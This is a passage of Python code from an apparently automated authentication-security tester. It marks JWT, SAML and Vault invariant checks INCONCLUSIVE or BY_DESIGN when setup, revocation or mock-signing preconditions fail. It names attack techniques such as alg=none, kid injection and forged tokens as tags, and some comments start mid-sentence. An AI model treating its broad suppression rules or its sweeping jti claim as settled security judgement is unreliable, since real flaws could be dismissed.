        # ── Failed modify/setup event precondition ──
        # If a sequence contains a modify_role_config (or similar modify) event
        # whose result was an error, subsequent assertions about the modified
        # state are not meaningful — the state never changed.
        # Detect this by checking for *_http_status captures from modify events
        # that indicate failure, or by checking event results if available.
        _modify_event_failed = False
        _modify_event_succeeded = False
        for key, val in self.captures.items():
            # modify events typically capture status as modify_* or second_*
            if ("modify" in key or "reconfigure" in key) and key.endswith("_status"):
                if val is not None and val != 200 and val != 204:
                    _modify_event_failed = True
                elif val in (200, 204, "200", "204"):
                    _modify_event_succeeded = True

        # ── Failed revoke event precondition ──
        # If a revoke_session / revoke event returned non-2xx (e.g. 401),
        # the revocation never happened. Post-revocation assertions are
        # not meaningful — the token/session was never actually revoked.
        _revoke_event_failed = False
        _revoke_failed_details = {}
        for key, val in self.captures.items():
            if "revoke" in key and key.endswith(("_http_status", "_status")):
                if val is not None and val not in (200, 204, "200", "204"):
                    _revoke_event_failed = True
                    _revoke_failed_details[key] = val

        # ── MFA bypass precondition ──
        # bypasses MFA by design. I3 assertions about MFA enforcement are only
        # meaningful when the login method can actually trigger MFA challenges.
        _auth_bypasses_mfa = (
            self.captures.get("_auth_method_bypass_mfa") == "true"
            or self.captures.get("_auth_method_service_account") == "true"
        )

        # ── SAML IdP-initiated flow precondition ──
        # When SAML sources use allow_idp_initiated=true, every login is
        # independent (no pending AuthnRequest state). I3 assertions about
        # cross-session splicing, InResponseTo mismatch, or RelayState reuse
        # are structurally untestable — there's no session state to splice.
        _seq_events = getattr(self, '_current_sequence_events', None) or []
        _has_saml_login = any(
            "saml_login" in str(getattr(ev, 'event_type', ''))
            for ev in _seq_events
        )
        # Check if all logins in a SAML sequence succeeded (status 200) — indicates
        # IdP-initiated mode where every login is accepted independently.
        _all_login_statuses = [
            str(self.captures.get(k, ""))
            for k in self.captures
            if k.endswith("_login_status") and str(self.captures.get(k, "")).isdigit()
        ]
        _all_logins_succeeded = _all_login_statuses and all(s == "200" for s in _all_login_statuses)
        _saml_idp_initiated = _has_saml_login and _all_logins_succeeded

        # ── SAML signature-bypass precondition ──
        # When SAML sources are created without verification_kp (no IdP cert
        # configured), signature verification is skipped entirely. I1 assertions
        # about attacker-signed certs being rejected are structurally untestable
        # because there's no trust anchor to validate against. This is a
        # configuration gap, not a code vulnerability.
        _saml_no_sig_verification = (
            _has_saml_login
            and _all_logins_succeeded
            and not any(
                self._looks_like_uuid(str(self.captures.get(k, "")))
                for k in self.captures
                if "verification_kp" in k
            )
        )

        # ── Trust anchor reconfiguration precondition ──
        # When a sequence calls configure_jwt_validation or configure_saml_auth
        # more than once, the executor auto-injects the test public key on each
        # call (to ensure the mock-IDP-signed tokens work).  This means the
        # "reconfiguration to attacker key" never actually changes the trust
        # anchor — the platform always trusts the same key.  Subsequent logins
        # with the "attacker" key succeed because they are signed by the same
        # key the platform trusts.  I1 assertions that expect rejection of
        # "attacker" tokens are therefore structurally untestable.
        #
        # Detection: count configure_jwt_validation / configure_saml_auth
        # HTTP-status captures that succeeded (200/204).  If >=2 such captures
        # exist, the trust anchor was reconfigured mid-sequence.
        _trust_reconfig_count = 0
        for key, val in self.captures.items():
            _is_config_status = (
                ("configure" in key or "config" in key or "reconfig" in key)
                and key.endswith("_status")
            )
            if _is_config_status and val in (200, 204, "200", "204"):
                _trust_reconfig_count += 1
        _trust_reconfigured = _trust_reconfig_count >= 2

        # ── Token/RPT active precondition ──
        # If ALL captured *_active variables are False, no token/RPT was
        # successfully created — assertions about active tokens are
        # infrastructure failures, not security findings.
        _active_captures = {
            k: v for k, v in self.captures.items()
            if "_active" in k and v is not None
        }
        _no_active_token = (
            bool(_active_captures) and
            all(v is False or v == "false" or v == False
                for v in _active_captures.values())
        )

        # ── Systematic code exchange failure precondition ──
        # When ALL captured *_exchange_status / *_redeem_status / *_rot*_status
        # values are 400, the code exchange mechanism is systematically broken
        # SAML endpoint misconfigured). Assertions that depend on successful
        # exchanges are infrastructure failures, not security findings.
        _exchange_status_captures = {
            k: v for k, v in self.captures.items()
            if (k.endswith("_status") and v is not None
                and any(tag in k for tag in ("exchange", "redeem", "_rot1", "_rot2",
                                             "rotation", "refresh")))
        }
        _all_exchanges_failed = (
            len(_exchange_status_captures) >= 2 and
            all(v == 400 or v == "400"
                for v in _exchange_status_captures.values())
        )

        # ── Systematic SAML/login failure precondition ──
        # When ALL captured *_saml*_status or *_status variables with "saml"
        # in their name are 'error', the SAML login mechanism is systematically
        # broken (e.g., SAML provider not configured, endpoint returning errors).
        _saml_status_captures = {
            k: v for k, v in self.captures.items()
            if "saml" in k and k.endswith("_status") and v is not None
        }
        _all_saml_failed = (
            len(_saml_status_captures) >= 2 and
            all(v == "error" or v == 400 or v == "400"
                for v in _saml_status_captures.values())
        )
        if not _all_saml_failed and "status" in self.captures:
            _gen_status = self.captures.get("status")
            _saml_like_status = {
                k: v for k, v in self.captures.items()
                if k.endswith("_status") and "saml" in k.lower()
            }
            if _gen_status == "error" and len(_saml_like_status) == 0:
                # Check if most status captures are 'error'
                _all_status_caps = {
                    k: v for k, v in self.captures.items()
                    if k.endswith("_status") and v is not None and v != ""
                }
                _error_count = sum(
                    1 for v in _all_status_caps.values()
                    if v == "error" or v == 400 or v == "400"
                )
                if _error_count >= 2 and _error_count == len(_all_status_caps):
                    _all_saml_failed = True

        # ── Group/policy setup failure precondition (Issues 4 & 5) ──
        # aliases, and attach policies. If these setup operations fail
        # (non-200/204 status), subsequent assertions about group-derived
        # access (expecting == 200 because of policy) will fail vacuously —
        # not because of a security bug, but because the prerequisite was
        # never established.
        #
        # Detection strategy (three signals):
        # 1. Explicit: check for __setup_failed_* markers set during execution
        # 2. Implicit: check for *_status captures from setup events that show errors
        # 3. Implicit: check for key setup variables (group_id, accessor) that are None
        _setup_event_tags = (
            "group", "alias", "policy", "attach", "identity_group",
            "group_alias", "mount_accessor", "accessor",
        )
        _setup_failed_events = {}
        for key, val in self.captures.items():
            # Signal 1: explicit tracking markers from execute()
            if key.startswith("__setup_failed_") and val is True:
                _setup_failed_events[key] = val
            # Signal 2: status captures from setup events
            if key.endswith("_status") and val is not None:
                _is_setup_event = any(tag in key for tag in _setup_event_tags)
                if _is_setup_event and val not in (200, 204, "200", "204"):
                    _setup_failed_events[key] = val
            # Signal 3: key setup variables that are None (accessor, group_id)
            if val is None and (
                key.endswith("_accessor") or
                key.endswith("_group_id") or
                key.endswith("_canonical_id")
            ):
                _setup_failed_events[key] = "None (not captured)"
        _has_setup_failure = bool(_setup_failed_events)
        if _has_setup_failure:
            logger.info(
                f"  [SETUP-PRECONDITION] Group/policy setup failures detected: "
                f"{_setup_failed_events}. I3/I5 assertions expecting group-derived "
                f"access will be marked INCONCLUSIVE."
            )

        # ── Admin-modified role precondition (I5 empty bound_claims) ──
        # When the admin explicitly modifies a role to empty bound_claims,
        # subsequent access broadening is BY_DESIGN — the admin intended it.
        # Assertions that expect denial (== 403) after admin broadening are
        # false positives because the admin explicitly removed the restriction.
        _admin_emptied_bound_claims = self.captures.get("__modify_emptied_bound_claims", False)
        _admin_modified_role = self.captures.get("__modify_role_succeeded", False)

        for check in checks:
            # Identity diversity precondition: if all entity_ids are identical
            # and this assertion compares entity_ids, mark INCONCLUSIVE.
            # Applies to ANY invariant whose assertion references entity_id
            # variables, not just I4 — because a constant identity function
            # makes ALL identity-comparing assertions vacuously fail.
            _assertion_refs_identity = (
                "entity_id" in check.assertion
                or "identity_id" in check.assertion
            )
            if not i4_diversity_ok and (check.invariant == "I4" or _assertion_refs_identity):
                verdict = Verdict(
                    invariant=check.invariant,
                    verdict_type=VerdictType.INCONCLUSIVE,
                    confidence="LOW",
                    description=(
                        f"INCONCLUSIVE — identity diversity precondition failed. "
                        f"All captured entity_ids are identical, indicating the "
                        f"authentication mechanism cannot distinguish principals "
                        f"(e.g., mock/test connector with fixed identity). "
                        f"I4 testing requires at least two distinct identity outputs. "
                        f"Assertion: {check.assertion}"
                    ),
                    evidence={
                        "assertion": check.assertion,
                        "reason": "i4_diversity_precondition_failed",
                        "unique_entity_ids": list(entity_ids),
                    },
                    cve_pattern="",
                    requires_manual_review=False,
                )
                verdicts.append(verdict)
                logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (diversity precondition) — {check.assertion}")
                continue

            # Email diversity precondition: if all captured emails are the
            # same and the assertion COMPARES _email variables across
            # different users, mark INCONCLUSIVE.  Only suppress assertions
            # that test identity diversity via email comparison (e.g.,
            # "user_a_email != user_b_email").  Assertions that merely
            # reference an email variable but test a flow property (e.g.,
            # PKCE enforcement via status code) are NOT suppressed.
            _assertion_refs_email = "_email" in check.assertion
            # Detect cross-user email comparison: two different *_email vars
            # connected by != or == operators.
            _email_vars_in_assertion = _re.findall(r'\w+_email\b', check.assertion)
            _unique_email_vars = set(_email_vars_in_assertion)
            _is_email_comparison = (
                _assertion_refs_email
                and len(_unique_email_vars) >= 2
                and ("!=" in check.assertion or "==" in check.assertion)
            )
            if not email_diversity_ok and _is_email_comparison:
                verdict = Verdict(
                    invariant=check.invariant,
                    verdict_type=VerdictType.INCONCLUSIVE,
                    confidence="LOW",
                    description=(
                        f"INCONCLUSIVE — email diversity precondition failed. "
                        f"All captured emails are identical, indicating the "
                        f"authentication mechanism cannot produce distinct email "
                        f"outputs for distinct principals (e.g., mock connector "
                        f"with fixed identity). "
                        f"Assertion: {check.assertion}"
                    ),
                    evidence={
                        "assertion": check.assertion,
                        "reason": "email_diversity_precondition_failed",
                        "unique_emails": list(captured_emails),
                    },
                    cve_pattern="",
                    requires_manual_review=False,
                )
                verdicts.append(verdict)
                logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (email diversity) — {check.assertion}")
                continue

            # MFA bypass precondition: if the password login used app-password
            # or client_credentials (which bypass MFA by design), I3 assertions
            # about MFA enforcement are not meaningful.
            _is_mfa_assertion = (
                check.invariant == "I3"
                and ("mfa" in check.assertion.lower()
                     or "mfa" in (check.violation_description or "").lower()
                     or "pwd" in check.assertion.lower() and "status" in check.assertion.lower())
            )
            if _auth_bypasses_mfa and _is_mfa_assertion:
                verdict = Verdict(
                    invariant=check.invariant,
                    verdict_type=VerdictType.INCONCLUSIVE,
                    confidence="LOW",
                    description=(
                        f"INCONCLUSIVE — MFA bypass precondition failed. "
                        f"The password login used app-password or client_credentials, "
                        f"which bypass MFA by design. I3 MFA assertions require "
                        f"interactive authentication that can trigger MFA challenges. "
                        f"Assertion: {check.assertion}"
                    ),
                    evidence={
                        "assertion": check.assertion,
                        "reason": "mfa_bypass_precondition_failed",
                        "_auth_method_bypass_mfa": self.captures.get("_auth_method_bypass_mfa"),
                    },
                    cve_pattern="",
                    requires_manual_review=False,
                )
                verdicts.append(verdict)
                logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (MFA bypass precondition) — {check.assertion}")
                continue

            # SAML no-verification-kp precondition: if the SAML source has no
            # verification_kp configured, signature checks are skipped. I1
            # assertions about attacker certs being rejected are structurally
            # untestable — the platform never validates signatures at all.
            _is_i1_saml_sig_assertion = (
                check.invariant == "I1"
                and _has_saml_login
                and ("cert" in check.assertion.lower()
                     or "sign" in check.assertion.lower()
                     or "attacker" in check.assertion.lower()
                     or "splice" in check.assertion.lower()
                     or "forge" in check.assertion.lower())
            )
            if _saml_no_sig_verification and _is_i1_saml_sig_assertion:
                verdict = Verdict(
                    invariant=check.invariant,
                    verdict_type=VerdictType.INCONCLUSIVE,
                    confidence="LOW",
                    description=(
                        f"INCONCLUSIVE — SAML source has no verification_kp configured; "
                        f"signature validation is disabled. I1 signature/trust assertions "
                        f"are untestable without a configured verification certificate. "
                        f"Assertion: {check.assertion}"
                    ),
                    evidence={"assertion": check.assertion,
                              "reason": "saml_no_verification_kp_precondition"},
                    cve_pattern="",
                    requires_manual_review=False,
                )
                verdicts.append(verdict)
                logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (no verification_kp) — {check.assertion}")
                continue

            # SAML IdP-initiated flow precondition: if all SAML logins
            # succeeded via IdP-initiated mode (no pending flow state), I3
            # assertions about cross-session splicing / InResponseTo / RelayState
            # are meaningless — every login is independent by design.
            _is_i3_saml_flow_assertion = (
                check.invariant == "I3"
                and _has_saml_login
                and ("splice" in check.assertion.lower()
                     or "relay" in check.assertion.lower()
                     or "swap" in check.assertion.lower()
                     or "finish" in check.assertion.lower()
                     or "inresponseto" in check.assertion.lower()
                     or "revok" in check.assertion.lower()
                     or "resume" in check.assertion.lower()
                     or "reuse" in check.assertion.lower())
            )
            if _saml_idp_initiated and _is_i3_saml_flow_assertion:
                verdict = Verdict(
                    invariant=check.invariant,
                    verdict_type=VerdictType.INCONCLUSIVE,
                    confidence="LOW",
                    description=(
                        f"INCONCLUSIVE — SAML IdP-initiated flow precondition. "
                        f"All SAML logins used IdP-initiated mode (allow_idp_initiated=true), "
                        f"which means each login is independent with no pending AuthnRequest state. "
                        f"I3 cross-session/flow-coherence assertions are structurally untestable. "
                        f"Assertion: {check.assertion}"
                    ),
                    evidence={"assertion": check.assertion, "reason": "saml_idp_initiated_precondition"},
                    cve_pattern="",
                    requires_manual_review=False,
                )
                verdicts.append(verdict)
                logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (SAML IdP-init precondition) — {check.assertion}")
                continue

            # Mock IDP crypto limitation: when an assertion expects a
            # login to fail (entity_id is None, http_status == 403) for a
            # variable labeled with an attack tag, but ALL logins
            # in the sequence succeeded, the mock IDP could not produce the
            # weakened credential.  The assertion is structurally untestable.
            # ONLY applies to JWT/OIDC — SAML assertions use genuinely forged
            # attacker certs, not the mock IDP's key.
            _is_saml_protocol = self.protocol == "saml" or any(
                e.event_type == "saml_login" for e in (getattr(self, '_current_seq_events', None) or [])
            )
            if _all_logins_succeeded and not _is_saml_protocol:
                _norm_a = check.assertion.lower()
                _expects_rejection = (
                    ("is none" in _norm_a and "is not none" not in _norm_a)
                    or "== 403" in _norm_a
                    or "!= 200" in _norm_a
                    or "== 401" in _norm_a
                )
                # Attack labels + trust-reconfig labels (admin_user after
                # trust-anchor substitution is also mock IDP artifact)
                _refs_attack_label = any(
                    tag in _norm_a
                    for tag in ("attacker", "forged", "_none_", "kid_",
                                "malicious", "splice", "emptyclaims",
                                "resign", "rotate", "oldkey", "stale",
                                "untrusted", "unsigned", "admin_user",
                                "anchor", "service_a_")
                )
                if _expects_rejection and _refs_attack_label:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — mock IDP crypto limitation. "
                            f"The mock IDP always signs with the trusted key, so "
                            f"cryptographic attack mutations (alg=none, kid injection, "
                            f"attacker key) produce validly-signed tokens. The assertion "
                            f"expects rejection but the credential was never actually "
                            f"weakened. Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "mock_idp_crypto_limitation",
                            "note": "Mock IDP cannot produce unsigned/attacker-signed "
                                    "tokens. All logins succeeded because all JWTs "
                                    "were validly signed by the trusted key.",
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (mock IDP crypto) — {check.assertion}")
                    continue

            # Baseline login failure: if a "control" or "trusted" login failed
            # (http_status != 200), the test infrastructure is broken and ALL
            # assertions in the sequence are meaningless.
            if _all_logins_succeeded:
                # Check if any *_http_status capture with "trusted"/"control" tag is non-200
                _trusted_failed = any(
                    k.endswith("_http_status") and v not in (200, "200", None)
                    and any(tag in k for tag in ("trusted", "control", "baseline", "anchor"))
                    for k, v in self.captures.items()
                )
                if _trusted_failed:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — baseline/control login failed (HTTP 403). "
                            f"The legitimate login did not succeed, so the test "
                            f"infrastructure is broken. Assertion: {check.assertion}"
                        ),
                        evidence={"assertion": check.assertion, "reason": "baseline_login_failed"},
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (baseline failed) — {check.assertion}")
                    continue

            # JWT auth), jti tracking is optional per RFC 7519 Section 4.1.7.
            # No major JWT auth system tracks jti. If an I2 assertion expects
            # replay to fail (session_token is None, http_status != 200) on a
            # JWT platform, it's testing by-design behavior.
            if check.invariant == "I2" and self.profile and self.profile.name == "vault":
                _norm_a_i2 = check.assertion.lower()
                _expects_replay_fail = (
                    ("is none" in _norm_a_i2 and "is not none" not in _norm_a_i2)
                    or "!= 200" in _norm_a_i2
                )
                _refs_replay = any(
                    tag in _norm_a_i2
                    for tag in ("replay", "second_", "reuse", "stateless", "revoked_replay")
                )
                if _expects_replay_fail and _refs_replay:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.BY_DESIGN,
                        confidence="HIGH",
                        description=(
                            f"BY_DESIGN — JWT replay is expected behavior. "
                            f"JWT is stateless by design (RFC 7519). jti tracking is "
                            f"optional (Section 4.1.7) and not implemented by any major "
                            f"JWT auth system. Assertion: {check.assertion}"
                        ),
                        evidence={"assertion": check.assertion, "reason": "jwt_stateless_replay"},
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] BY_DESIGN (JWT stateless replay) — {check.assertion}")
                    continue

            # Failed modify/setup event precondition: if a modify_role_config
            # event failed (status != 200/204) and this assertion references
            # "second", "after", or "modified" state, the assertion tests a
            # state change that never occurred.
            if _modify_event_failed:
                _norm_a_mod = check.assertion.lower()
                _refs_modified_state = any(
                    tag in _norm_a_mod
                    for tag in ("second_", "after_", "modified_", "_second_",
                                "emptyclaims", "_reconfigured_", "_tightened_")
                )
                if _refs_modified_state:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — modify/setup event failed. "
                            f"The sequence contains a modify event that returned an error, "
                            f"so assertions about changed state are not meaningful. "
                            f"Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "modify_event_failed",
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (modify event failed) — {check.assertion}")
                    continue

            # ── Revoke event failure precondition ──
            # If a revoke event failed (non-2xx) and this assertion checks
            # post-revocation state (*_postrevoke_*, *_active after revoke),
            # the assertion is meaningless — the revocation never happened.
            if _revoke_event_failed:
                _norm_a_rev = check.assertion.lower()
                _refs_postrevoke = any(
                    tag in _norm_a_rev
                    for tag in ("postrevoke", "post_revoke", "after_revoke",
                                "revoked_", "_revoked", "sessA_active",
                                "sessB_active", "revocation_")
                )
                # Also detect pattern: assertion about *_active after a revoke
                # event that failed — the token is still active because revoke
                # was never executed, not because the platform is broken.
                if not _refs_postrevoke and "_active" in _norm_a_rev:
                    # Check if ANY _active variable's associated revoke status failed
                    # Use ORIGINAL assertion (not lowered) for variable extraction
                    # to preserve case for capture key matching.
                    for _act_var in _re.findall(r'(\w+_active)\b', check.assertion):
                        _user_prefix = _act_var.rsplit("_active", 1)[0]
                        _revoke_key = f"{_user_prefix}_revoke_http_status"
                        if _revoke_key not in self.captures:
                            # Try broader match: also try without "user_" prefix
                            # (captures may use auth_as prefix inconsistently)
                            _prefixes_to_try = [_user_prefix.rstrip("_")]
                            if _user_prefix.startswith("user_"):
                                _prefixes_to_try.append(_user_prefix[5:].rstrip("_"))
                            _revoke_key = next(
                                (k for k in self.captures
                                 if any(p in k for p in _prefixes_to_try)
                                 and "revoke" in k and k.endswith(("_http_status", "_status"))),
                                None,
                            )
                        if _revoke_key and self.captures.get(_revoke_key) not in (200, 204, "200", "204", None):
                            _refs_postrevoke = True
                            break
                if _refs_postrevoke:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — revoke event failed ({_revoke_failed_details}). "
                            f"The revocation request returned a non-2xx status (e.g., 401 "
                            f"invalid_client), so the token/session was never actually revoked. "
                            f"Post-revocation assertions are not meaningful. "
                            f"Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "revoke_event_failed",
                            "revoke_statuses": _revoke_failed_details,
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (revoke event failed: {_revoke_failed_details}) — {check.assertion}")
                    continue

            # Group/policy setup failure precondition (Issues 4 & 5):
            # When setup events for groups/aliases/policies failed, I3/I5
            # assertions that expect group-derived access (== 200) or expect
            # policy-restricted denial (== 403) based on group/policy config
            # are not meaningful — the prerequisite was never established.
            #
            # Two detection modes:
            # A. Explicit: setup events tracked as failed (_has_setup_failure)
            # B. Implicit: sequence has group/alias/policy captures, and an
            #    assertion expects == 200 but the actual value is 403, meaning
            #    the group-derived access was never granted.
            if check.invariant in ("I3", "I5"):
                _norm_a_setup = check.assertion.lower()
                _refs_http_status = "_http_status" in _norm_a_setup

                if _refs_http_status:
                    # Check if captures contain group/alias/policy-related variables
                    _has_group_context = any(
                        any(tag in key for tag in ("group", "alias", "accessor", "canonical"))
                        for key in self.captures
                    )

                    # Find status vars in the assertion and check for the
                    # "expects 200 but got 403" pattern
                    _status_vars_in_assertion = [
                        v for v in _re.findall(r'[a-zA-Z_]\w*', _norm_a_setup)
                        if v.endswith("_http_status") or v.endswith("_status")
                    ]
                    _has_contradicting_status = False
                    _contradicting_details = {}
                    for sv in _status_vars_in_assertion:
                        actual_val = self.captures.get(sv)
                        # Expects 200 but got 400/403 → setup never granted access
                        _is_error_status = actual_val in (
                            400, "400", 403, "403", 404, "404", 500, "500"
                        )
                        _expects_200 = (
                            f"{sv} == 200" in _norm_a_setup
                            or f"{sv}== 200" in _norm_a_setup
                        )
                        if _is_error_status and _expects_200:
                            _has_contradicting_status = True
                            _contradicting_details[sv] = {
                                "expected": 200, "actual": actual_val
                            }

                    if _has_contradicting_status and (_has_setup_failure or _has_group_context):
                        verdict = Verdict(
                            invariant=check.invariant,
                            verdict_type=VerdictType.INCONCLUSIVE,
                            confidence="LOW",
                            description=(
                                f"INCONCLUSIVE — prerequisite setup failed: "
                                f"group/policy not configured. "
                                + (f"Setup events returned errors: {_setup_failed_events}. "
                                   if _has_setup_failure else
                                   f"Sequence involves group/alias/policy setup, "
                                   f"but group-derived access was never granted. ")
                                + f"Assertions expecting group-derived access "
                                f"(== 200) are not meaningful when the group/"
                                f"alias/policy was never created successfully. "
                                f"Assertion: {check.assertion}"
                            ),
                            evidence={
                                "assertion": check.assertion,
                                "reason": "setup_prerequisite_failed",
                                "contradicting_status": _contradicting_details,
                                "failed_setup_events": _setup_failed_events if _has_setup_failure else {},
                            },
                            cve_pattern="",
                            requires_manual_review=False,
                        )
                        verdicts.append(verdict)
                        logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (setup failed) — {check.assertion}")
                        continue

            # Admin-modified role precondition (I5 empty bound_claims):
            # When the admin explicitly emptied bound_claims via modify_role_config,
            # assertions that expect denial (== 403) for users outside the original
            # scope are false positives — the admin intentionally broadened access.
            if _admin_emptied_bound_claims and check.invariant == "I5":
                _norm_a_i5 = check.assertion.lower()
                _expects_denial = "== 403" in _norm_a_i5
                if _expects_denial:
                    # Check if the assertion's status variable actually shows 200
                    _status_vars = [
                        v for v in _re.findall(r'[a-zA-Z_]\w*', _norm_a_i5)
                        if v.endswith("_http_status") or v.endswith("_status")
                    ]
                    _got_200_instead = any(
                        self.captures.get(sv) in (200, "200")
                        for sv in _status_vars
                        if f"{sv} == 403" in _norm_a_i5
                    )
                    if _got_200_instead:
                        verdict = Verdict(
                            invariant=check.invariant,
                            verdict_type=VerdictType.BY_DESIGN,
                            confidence="HIGH",
                            description=(
                                f"BY_DESIGN — admin explicitly emptied bound_claims "
                                f"via modify_role_config. Access broadening after an "
                                f"admin-initiated policy change is expected behavior, "
                                f"not a vulnerability. The admin intentionally removed "
                                f"claim constraints. "
                                f"Assertion: {check.assertion}"
                            ),
                            evidence={
                                "assertion": check.assertion,
                                "reason": "admin_emptied_bound_claims",
                            },
                            cve_pattern="",
                            requires_manual_review=False,
                        )
                        verdicts.append(verdict)
                        logger.info(f"  [ASSERT] [{check.invariant}] BY_DESIGN (admin emptied bound_claims) — {check.assertion}")
                        continue

            # Trust anchor reconfiguration precondition: if the sequence
            # reconfigured the trust anchor (configure_jwt_validation /
            # configure_saml_auth) and the I1 assertion expects rejection of
            # a token signed by the "new" (attacker) key, the assertion is
            # structurally untestable because the executor auto-injects the
            # real public key on every configure call.
            if _trust_reconfigured and check.invariant == "I1":
                _norm_a_tr = check.assertion.lower()
                _refs_attack_rejection = any(
                    tag in _norm_a_tr
                    for tag in ("is none", "== none", "!= 200", "== 403",
                                "should reject", "should fail", "attacker",
                                "resign", "forged", "substitut")
                )
                if _refs_attack_rejection:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — trust anchor was reconfigured mid-sequence. "
                            f"The executor auto-injects the test public key on every "
                            f"configure_jwt_validation call, so the 'attacker key' "
                            f"reconfiguration never actually changes the trust anchor. "
                            f"Login with the 'attacker' token succeeds because it is "
                            f"signed by the same key the platform trusts. "
                            f"Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "trust_anchor_reconfigured",
                            "config_status_captures": _trust_reconfig_count,
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (trust reconfigured) — {check.assertion}")
                    continue

            # Token/RPT active precondition: if no token was successfully
            # created (all *_active captures are False) and the assertion
            # checks for _active == true, the test infrastructure couldn't
            # establish the prerequisite.
            if _no_active_token and "_active" in check.assertion:
                _norm_act = check.assertion.lower()
                if "== true" in _norm_act or "is true" in _norm_act:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — no token/RPT was successfully created. "
                            f"All *_active captures are False, indicating the test "
                            f"infrastructure could not establish the prerequisite "
                            f"(e.g., RPT creation failed). "
                            f"Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "no_active_token",
                            "active_captures": {k: v for k, v in _active_captures.items()},
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (no active token) — {check.assertion}")
                    continue

            # Systematic code exchange failure: when ALL exchange/redeem/refresh
            # status captures are 400, the flow mechanism itself is broken (e.g.,
            # endpoint returns errors).  Any assertion referencing exchange/refresh
            # status is an infrastructure failure.
            if _all_exchanges_failed:
                _norm_a_exc = check.assertion.lower()
                _refs_exchange = any(
                    tag in _norm_a_exc
                    for tag in ("exchange", "redeem", "rotation", "refresh",
                                "_rot1", "_rot2", "_status")
                )
                if _refs_exchange:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — systematic code exchange failure. "
                            f"All {len(_exchange_status_captures)} exchange/refresh "
                            f"operations returned 400, indicating the flow mechanism "
                            f"is broken (e.g., auth code already consumed by "
                            f"auto-exchange, or endpoint misconfigured). "
                            f"Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "systematic_exchange_failure",
                            "exchange_statuses": {k: v for k, v in _exchange_status_captures.items()},
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (exchange failure) — {check.assertion}")
                    continue

            # Systematic SAML login failure: when ALL SAML-related status captures
            # are 'error' / 400, the SAML mechanism is broken. Assertions about
            # SAML login results are infrastructure failures.
            if _all_saml_failed:
                _norm_a_saml = check.assertion.lower()
                _refs_saml_status = (
                    "status" in _norm_a_saml and (
                        "saml" in _norm_a_saml
                        or '== "ok"' in _norm_a_saml
                        or "== 'ok'" in _norm_a_saml
                        or "ok" in _norm_a_saml
                    )
                )
                if _refs_saml_status:
                    verdict = Verdict(
                        invariant=check.invariant,
                        verdict_type=VerdictType.INCONCLUSIVE,
                        confidence="LOW",
                        description=(
                            f"INCONCLUSIVE — systematic SAML login failure. "
                            f"All SAML login operations returned errors, indicating "
                            f"the SAML mechanism is broken (e.g., provider not "
                            f"configured, endpoint returning errors). "
                            f"Assertion: {check.assertion}"
                        ),
                        evidence={
                            "assertion": check.assertion,
                            "reason": "systematic_saml_failure",
                            "saml_statuses": {k: v for k, v in _saml_status_captures.items()},
                        },
                        cve_pattern="",
                        requires_manual_review=False,
                    )
                    verdicts.append(verdict)
                    logger.info(f"  [ASSERT] [{check.invariant}] INCONCLUSIVE (SAML failure) — {check.assertion}")
                    continue

            # If a baseline check already failed, mark remaining checks INCONCLUSIVE
            if baseline_failed:
                verdict = Verdict(
                    invariant=check.invariant,
                    verdict_type=VerdictType.INCONCLUSIVE,
                    confidence="LOW",
                    description=(
                        f"INCONCLUSIVE — a baseline check failed earlier in this sequence. "
                        f"The mechanism cannot distinguish principals, so this assertion "
                        f"is not meaningful. Assertion: {check.assertion}"
                    ),
